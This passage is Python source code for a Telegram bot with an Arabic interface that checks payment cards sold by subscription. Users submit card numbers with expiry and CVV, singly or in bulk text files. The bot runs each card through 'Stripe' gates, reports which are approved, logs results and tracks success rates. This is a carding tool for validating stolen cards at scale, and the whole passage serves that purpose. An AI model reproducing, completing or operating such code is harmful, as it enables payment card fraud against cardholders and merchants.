<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        
        bot.send_message(user.id if chat_type == "private" else chat_id, welcome, 
                        parse_mode='HTML', reply_markup=self.ui.main_menu(chat_type))
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        sub = data.get('subscription', {})
        default_gate = data.get('default_gate', 'stripe1')
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe v1")
        expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
        total = usage.get('total_checks', 0)
        approved = usage.get('approved', 0)
        declined = usage.get('declined', 0)
        
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>👤 الاسم:</b> {data.get('first_name', 'Unknown')}
<b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub.get('active') else '🔹 عادي'}
<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>📅 الانضمام:</b> {data.get('joined_date', 'Unknown')[:10]}

<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• ❌ المرفوضة: {declined}
• 📈 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%

<b>💎 الاشتراك:</b> {sub.get('plan', 'لا يوجد')} | ينتهي: {expiry}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats.get("daily_stats", {}).get(today, {"checks": 0, "approved": 0})
        total = stats.get('total_checks', 0)
        approved = stats.get('total_approved', 0)
        declined = stats.get('total_declined', 0)
        
        gates_usage = stats.get('gates_usage', {})
        gates_text = "\n".join([f"  {GATES.get(g, {}).get('icon', '🚪')} {g}: {c}" for g, c in gates_usage.items()][:5])
        
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📅 <b>اليوم:</b> {daily['checks']} فحص | ✅ {daily['approved']}
━━━━━━━━━━━━
📈 <b>الإجمالي:</b> {total} فحص
✅ المقبولة: {approved}
❌ المرفوضة: {declined}
📊 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🚪 <b>استخدام البوابات:</b>
{gates_text if gates_text else '  لا توجد بيانات'}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_subscribe(self, message):
        sub = DataManager.get_user_subscription(message.from_user.id)
        if sub:
            expiry_date = sub.get('expiry', '')
            if expiry_date and expiry_date != "2099-12-31":
                remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
                text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
            else:
                text = "💎 لديك اشتراك دائم (Lifetime)"
            bot.reply_to(message, text, parse_mode='HTML')
        else:
            plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
            text = f"""
💎 <b>خطط الاشتراك</b>
━━━━━━━━━━━━
{plans}
━━━━━━━━━━━━
<b>للاشتراك تواصل مع المطور:</b> {DEV_CONTACT}
"""
            bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_default_gate(self, message):
        user_id = message.from_user.id
        current_gate = DataManager.get_user_default_gate(user_id)
        bot.reply_to(message, f"⚙️ <b>اختر البوابة الافتراضية</b>\n\nالبوابة الحالية: {GATES[current_gate]['icon']} {GATES[current_gate]['name']}",
                    parse_mode='HTML', reply_markup=self.ui.default_gate_menu(current_gate))
    
    def handle_set_default_gate(self, call, gate_id):
        if DataManager.set_user_default_gate(call.from_user.id, gate_id):
            gate_name = GATES[gate_id]['name']
            bot.answer_callback_query(call.id, f"✅ تم تعيين {gate_name} كبوابة افتراضية")
            bot.edit_message_text(f"✅ تم تعيين {gate_name} كبوابة افتراضية\n\nالآن أي بطاقة ترسلها سيتم فحصها بهذه البوابة",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=self.ui.back_button())
        else:
            bot.answer_callback_query(call.id, "❌ فشل في تعيين البوابة")
    
    # ========== الفحص التلقائي ==========
    
    def save_last_file(self, user_id: int, file_id: str, file_name: str, content: str):
        """حفظ آخر ملف أرسله المستخدم"""
        self.user_last_file[user_id] = {
            "file_id": file_id,
            "file_name": file_name,
            "content": content,
            "timestamp": datetime.now().isoformat()
        }
        # تنظيف الملفات القديمة (أكثر من ساعة)
        for uid in list(self.user_last_file.keys()):
            try:
                ts = datetime.fromisoformat(self.user_last_file[uid]["timestamp"])
                if (datetime.now() - ts).seconds > 3600:
                    del self.user_last_file[uid]
            except:
                pass
    
    def get_last_file(self, user_id: int) -> Optional[Dict]:
        """الحصول على آخر ملف أرسله المستخدم"""
        return self.user_last_file.get(user_id)
    
    def auto_check_cards(self, message, cards: List[Dict], gate: str = None):
        """فحص البطاقات تلقائياً (واحدة تلو الأخرى)"""
        if not cards:
            return
        
        if gate is None:
            gate = DataManager.get_user_default_gate(message.from_user.id)
        
        if gate not in GATES or not GATES[gate]['enabled']:
            gate = "stripe1"
        
        if len(cards) == 1:
            self.check_single_card(message, cards[0], gate)
        else:
            self.check_multiple_cards(message, cards, gate)
    
    def check_single_card(self, message, card: Dict, gate: str):
        """فحص بطاقة واحدة"""
        msg = bot.reply_to(message, f"🔄 جاري الفحص عبر {GATES[gate]['icon']} {GATES[gate]['name']}...")
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            DataManager.update_usage(message.from_user.id, gate, resp)
            DataManager.save_card_result(card['original'], GATES[gate]['name'], resp, message.from_user.id, approved)
            
            bot.delete_message(msg.chat.id, msg.message_id)
            bot.reply_to(message, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
            
        except Exception as e:
            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", msg.chat.id, msg.message_id)
    
    def check_multiple_cards(self, message, cards: List[Dict], gate: str):
        """فحص عدة بطاقات متسلسلة"""
        check_id = message.message_id
        
        self.active_checks[check_id] = {
            'cards': cards,
            'user_id': message.from_user.id,
            'chat_id': message.chat.id,
            'message_id': message.message_id,
            'gate': gate,
            'stop': False
        }
        
        self.live_stats[message.from_user.id] = {
            'total': len(cards),
            'checked': 0,
            'approved': 0,
            'declined': 0
        }
        
        asyncio.run_coroutine_threadsafe(self.process_mass_async(check_id, gate), asyncio.new_event_loop())
    
    async def process_mass_async(self, check_id, gate):
        data = self.active_checks.get(check_id)
        if not data:
            return
        
        cards = data['cards']
        uid, cid = data['user_id'], data['chat_id']
        stats = self.live_stats[uid]
        
        msg = await asyncio.get_event_loop().run_in_executor(
            None,
            lambda: bot.send_message(
                cid,
                f"🔄 بدء الفحص المتسلسل عبر {GATES[gate]['icon']} {GATES[gate]['name']}\n\n{Helpers.format_live_stats(len(cards), 0, 0, 0)}",
                parse_mode='HTML',
                reply_markup=self.ui.stop_button(check_id)
            )
        )
        
        for i, card in enumerate(cards, 1):
            if data.get('stop'):
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: bot.edit_message_text(
                        f"⛔ تم إيقاف الفحص\n\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
                        msg.chat.id, msg.message_id, parse_mode='HTML'
                    )
                )
                break
            
            try:
                current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
                
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: bot.edit_message_text(
                        f"🔄 <b>جاري الفحص</b> {GATES[gate]['icon']}\n\n📌 <code>{current_card}</code>\n\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'], current_card)}",
                        msg.chat.id, msg.message_id, parse_mode='HTML',
                        reply_markup=self.ui.stop_button(check_id)
                    )
                )
                
                approved, resp = await self.gateways.check_card(gate, card)
                stats['checked'] += 1
                
                if approved:
                    stats['approved'] += 1
                else:
                    stats['declined'] += 1
                
                DataManager.update_usage(uid, gate, resp)
                DataManager.save_card_result(card['original'], GATES[gate]['name'], resp, uid, approved)
                
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: bot.send_message(
                        cid,
                        self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved),
                        parse_mode='HTML'
                    )
                )
                
                await asyncio.sleep(2)
                
            except Exception as e:
                stats['checked'] += 1
                stats['declined'] += 1
        
        final_text = f"✅ <b>اكتمل الفحص المتسلسل</b>\n\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}"
        
        await asyncio.get_event_loop().run_in_executor(
            None,
            lambda: bot.edit_message_text(final_text, msg.chat.id, msg.message_id, parse_mode='HTML')
        )
        
        del self.active_checks[check_id]
        del self.live_stats[uid]
    
    def check_last_file(self, message):
        """فحص آخر ملف أرسله المستخدم"""
        user_id = message.from_user.id
        last_file = self.get_last_file(user_id)
        
        if not last_file:
            bot.reply_to(message, "❌ لم تقم بإرسال أي ملف من قبل\nأرسل ملف txt أولاً ثم استخدم هذا الأمر")
            return
        
        cards = Helpers.extract_cards_from_text(last_file["content"])
        
        if not cards:
            bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف المحفوظ")
            return
        
        gate = DataManager.get_user_default_gate(user_id)
        
        bot.reply_to(message, f"📁 جاري فحص آخر ملف: {last_file['file_name']}\n📊 عدد البطاقات: {len(cards)}\n🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}")
        
        self.check_multiple_cards(message, cards, gate)
    
    def stop_check(self, call, check_id):
        if check_id in self.active_checks:
            self.active_checks[check_id]['stop'] = True
            bot.answer_callback_query(call.id, "⛔ جاري إيقاف الفحص...")
        else:
            bot.answer_callback_query(call.id, "❌ لا يوجد فحص نشط")
    
    # ========== الأوامر اليدوية ==========
    
    def handle_single(self, message, gate):
        if not self.check_sub(message):
            return
        
        parts = message.text.strip().split(' ', 1)
        # إزالة منشن البوت إذا وجد
        if len(parts) > 0 and '@' in parts[0]:
            parts[0] = parts[0].split('@')[0]
        
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv\nمثال: /{GATES[gate]['command']} 4111111111111111|12|25|123")
            return
        
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة\nالصيغة: رقم|شهر|سنة|cvv")
            return
        
        if not Helpers.luhn_check(card['number']):
            bot.reply_to(message, "❌ البطاقة غير صالحة (Luhn check failed)")
            return
        
        self.check_single_card(message, card, gate)
    
    def handle_mass(self, message, gate):
        if not self.check_sub(message):
            return
        
        # التحقق من وجود ملف مرفق أو آخر ملف محفوظ
        if message.document:
            self.handle_file_upload(message, gate)
        else:
            # لا يوجد ملف مرفق، نفحص آخر ملف
            last_file = self.get_last_file(message.from_user.id)
            if last_file:
                cards = Helpers.extract_cards_from_text(last_file["content"])
                if cards:
                    bot.reply_to(message, f"📁 استخدام آخر ملف: {last_file['file_name']}\n📊 عدد البطاقات: {len(cards)}")
                    self.check_multiple_cards(message, cards, gate)
                else:
                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف المحفوظ")
            else:
                bot.reply_to(message, f"📁 أرسل ملف txt بالبطاقات\nاستخدم: /{GATES[gate]['mass_command']}")
    
    def handle_file_upload(self, message, gate=None):
        """معالجة الملفات المرفوعة"""
        if not self.check_sub(message):
            return
        
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
            cards = Helpers.extract_cards_from_text(content)
            
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف")
                return
            
            # حفظ آخر ملف
            self.save_last_file(
                message.from_user.id,
                message.document.file_id,
                message.document.file_name,
                content
            )
            
            if gate is None:
                gate = DataManager.get_user_default_gate(message.from_user.id)
            
            bot.reply_to(message, f"📁 تم استلام الملف: {message.document.file_name}\n📊 عدد البطاقات: {len(cards)}\n🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}\n🔄 جاري بدء الفحص...")
            
            self.check_multiple_cards(message, cards, gate)
            
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ في قراءة الملف: {str(e)[:50]}")
    
    # ========== الأوامر الإدارية ==========
    
    def handle_add_sub(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ الصيغة: /addsub [ايدي المستخدم] [المدة بالأيام]\nمثال: /addsub 123456789 30")
                return
            
            user_id = int(parts[1])
            days = int(parts[2]) if len(parts) > 2 else 30
            
            if DataManager.add_subscription(user_id, days):
                try:
                    bot.send_message(user_id, f"🎉 تم تفعيل اشتراكك لمدة {days} يوم بنجاح!\nاستمتع بفحص البطاقات.")
                except:
                    pass
                
                bot.reply_to(message, f"""
✅ <b>تم إضافة الاشتراك بنجاح</b>
━━━━━━━━━━━━
👤 <b>المستخدم:</b> <code>{user_id}</code>
📅 <b>المدة:</b> {days} يوم
📆 <b>ينتهي:</b> {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}
━━━━━━━━━━━━
تم إشعار المستخدم.
""", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ فشل في إضافة الاشتراك")
                
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")
    
    def handle_remove_sub(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ الصيغة: /removesub [ايدي المستخدم]")
                return
            
            user_id = int(parts[1])
            
            if DataManager.remove_subscription(user_id):
                try:
                    bot.send_message(user_id, "⚠️ تم إلغاء اشتراكك. للاشتراك مرة أخرى تواصل مع المطور.")
                except:
                    pass
                
                bot.reply_to(message, f"✅ تم إزالة اشتراك المستخدم <code>{user_id}</code>", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ فشل في إزالة الاشتراك")
                
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")
    
    def handle_users_list(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        users = DataManager.load_users()
        total_users = len(users)
        active_subs = 0
        total_checks = 0
        
        for user in users.values():
            if user.get("subscription", {}).get("active"):
                active_subs += 1
            total_checks += user.get("usage", {}).get("total_checks", 0)
        
        text = f"""
📋 <b>قائمة المستخدمين</b>
━━━━━━━━━━━━
👥 <b>إجمالي المستخدمين:</b> {total_users}
💎 <b>المشتركين النشطين:</b> {active_subs}
📊 <b>إجمالي الفحوصات:</b> {total_checks}
━━━━━━━━━━━━
"""
        
        user_list = []
        for uid, user in list(users.items())[:10]:
            username = user.get("username", "لا يوجد")
            sub_status = "✅" if user.get("subscription", {}).get("active") else "❌"
            checks = user.get("usage", {}).get("total_checks", 0)
            user_list.append(f"{sub_status} <code>{uid}</code> | @{username} | {checks} فحص")
        
        if user_list:
            text += "\n".join(user_list)
            if len(users) > 10:
                text += f"\n\n... و {len(users) - 10} مستخدم آخر"
        else:
            text += "لا يوجد مستخدمين"
        
        text += "\n━━━━━━━━━━━━\nاستخدم /users لرؤية الكل"
        
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_group_settings(self, message):
        """إعدادات المجموعات (للمشرفين فقط)"""
        if message.from_user.id not in ADMIN_IDS:
            return
        
        chat_id = message.chat.id
        groups = DataManager.load_groups()
        group_set = groups.get("group_settings", {}).get(str(chat_id), {})
        
        status = "🟢 مفعل" if not group_set.get("disabled", False) else "🔴 معطل"
        
        text = f"""
⚙️ <b>إعدادات المجموعة</b>
━━━━━━━━━━━━
📌 <b>المجموعة:</b> {message.chat.title if message.chat.title else "هذه المحادثة"}
🆔 <b>المعرف:</b> <code>{chat_id}</code>
🎯 <b>الحالة:</b> {status}
━━━━━━━━━━━━
استخدم الأزرار للتحكم:
"""
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔧 تبديل التفعيل", callback_data=f"toggle_group_{chat_id}"),
            InlineKeyboardButton("📊 إحصائيات المجموعة", callback_data=f"group_stats_{chat_id}"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
        )
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=markup)
    
    def toggle_group(self, chat_id: int):
        """تفعيل/تعطيل المجموعة"""
        groups = DataManager.load_groups()
        if "group_settings" not in groups:
            groups["group_settings"] = {}
        
        str_chat_id = str(chat_id)
        if str_chat_id not in groups["group_settings"]:
            groups["group_settings"][str_chat_id] = {"disabled": False}
        
        groups["group_settings"][str_chat_id]["disabled"] = not groups["group_settings"][str_chat_id].get("disabled", False)
        DataManager.save_groups(groups)
        
        return groups["group_settings"][str_chat_id]["disabled"]

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        data = call.data
        uid = call.from_user.id
        
        if data == "back_main":
            chat_type = Helpers.get_chat_type(call.message.chat.id)
            bot.edit_message_text("✨ القائمة الرئيسية", call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.main_menu(chat_type), parse_mode='HTML')
        
        elif data == "my_profile":
            self.handler.handle_profile(call.message)
        
        elif data == "stats":
            self.handler.handle_stats(call.message)
        
        elif data == "subscribe":
            sub = DataManager.get_user_subscription(uid)
            if sub:
                expiry_date = sub.get('expiry', '')
                if expiry_date and expiry_date != "2099-12-31":
                    remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
                    text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
                else:
                    text = "💎 لديك اشتراك دائم (Lifetime)"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     reply_markup=UserInterface.back_button())
            else:
                plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
                text = f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك: {DEV_CONTACT}"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     parse_mode='HTML', reply_markup=UserInterface.back_button())
        
        elif data == "default_gate":
            self.handler.handle_default_gate(call.message)
        
        elif data == "mass_check":
            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m لفحص آخر ملف",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.back_button())
        
        elif data == "check_last_file":
            self.handler.check_last_file(call.message)
            bot.answer_callback_query(call.id)
        
        elif data.startswith("set_default_"):
            gate_id = data.replace("set_default_", "")
            self.handler.handle_set_default_gate(call, gate_id)
        
        elif data.startswith("gate_"):
            gate = data.replace("gate_", "")
            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                  call.message.chat.id, call.message.message_id,
                                  parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
        
        elif data.startswith("stop_"):
            cid = int(data.replace("stop_", ""))
            self.handler.stop_check(call, cid)
        
        elif data.startswith("toggle_group_"):
            if uid in ADMIN_IDS:
                chat_id = int(data.replace("toggle_group_", ""))
                disabled = self.handler.toggle_group(chat_id)
                status = "معطل 🔴" if disabled else "مفعل 🟢"
                bot.answer_callback_query(call.id, f"تم {status} المجموعة")
                self.handler.handle_group_settings(call.message)
        
        # الأوامر الإدارية
        elif data == "admin_users":
            if uid in ADMIN_IDS:
                self.handler.handle_users_list(call.message)

# ==================== إعداد البوت ====================
def setup():
    DataManager.init_files()
    
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['help'])
    def help(m): 
        chat_type = Helpers.get_chat_type(m.chat.id)
        if chat_type == "private":
            bot.reply_to(m, "📚 أرسل البطاقة مباشرة أو استخدم /start للقائمة الرئيسية")
        else:
            bot.reply_to(m, f"📚 أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>", parse_mode='HTML')
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['subscribe'])
    def sub(m): handler.handle_subscribe(m)
    
    @bot.message_handler(commands=['default'])
    def default(m): handler.handle_default_gate(m)
    
    @bot.message_handler(commands=['lastfile'])
    def lastfile(m): handler.check_last_file(m)
    
    # الأوامر الإدارية
    @bot.message_handler(commands=['addsub'])
    def addsub(m): handler.handle_add_sub(m)
    
    @bot.message_handler(commands=['removesub'])
    def removesub(m): handler.handle_remove_sub(m)
    
    @bot.message_handler(commands=['users'])
    def users(m): handler.handle_users_list(m)
    
    @bot.message_handler(commands=['groupsettings'])
    def groupsettings(m): handler.handle_group_settings(m)
    
    # بوابات يدوية
    @bot.message_handler(commands=['st1'])
    def stripe1(m): handler.handle_single(m, 'stripe1')
    
    @bot.message_handler(commands=['st1m'])
    def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
    
    @bot.message_handler(commands=['st2'])
    def stripe2(m): handler.handle_single(m, 'stripe2')
    
    @bot.message_handler(commands=['st2m'])
    def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
    
    # ========== الفحص التلقائي ==========
    
    @bot.message_handler(content_types=['document'])
    def handle_document(m):
        """فحص الملفات تلقائياً"""
        if not handler.check_sub(m):
            return
        handler.handle_file_upload(m)
    
    @bot.message_handler(func=lambda m: True)
    def handle_text(m):
        """فحص النص تلقائياً (مع دعم منشن البوت في المجموعات)"""
        if not handler.check_sub(m):
            return
        
        text = m.text.strip()
        
        # إزالة منشن البوت إذا وجد
        if f"@{BOT_USERNAME}" in text:
            text = text.replace(f"@{BOT_USERNAME}", "").strip()
        
        # استخراج البطاقات من النص
        cards = Helpers.extract_cards_from_text(text)
        
        if cards:
            if len(cards) == 1:
                handler.auto_check_cards(m, cards)
            else:
                bot.reply_to(m, f"📝 تم العثور على {len(cards)} بطاقة في النص\n🔄 جاري بدء الفحص المتسلسل...")
                handler.auto_check_cards(m, cards)
        else:
            # رسالة عادية - فقط في الخاص
            if Helpers.get_chat_type(m.chat.id) == "private":
                bot.reply_to(m, "⚠️ أمر غير معروف\n\n💡 يمكنك إرسال البطاقة مباشرة بالصيغة:\n<code>4111111111111111|12|25|123</code>\n\nأو إرسال ملف txt للفحص التلقائي",
                            parse_mode='HTML', reply_markup=UserInterface.main_menu("private"))
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    # Health check server
    def run_health():
        port = int(os.environ.get('PORT', 10000))
        with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
            print(f"🌐 Health check on {port}")
            httpd.serve_forever()
    
    threading.Thread(target=run_health, daemon=True).start()
    
    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + "✅ البوت جاهز للعمل!" + Style.RESET_ALL)
    
    bot.infinity_polling()

# ==================== التشغيل ====================
if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
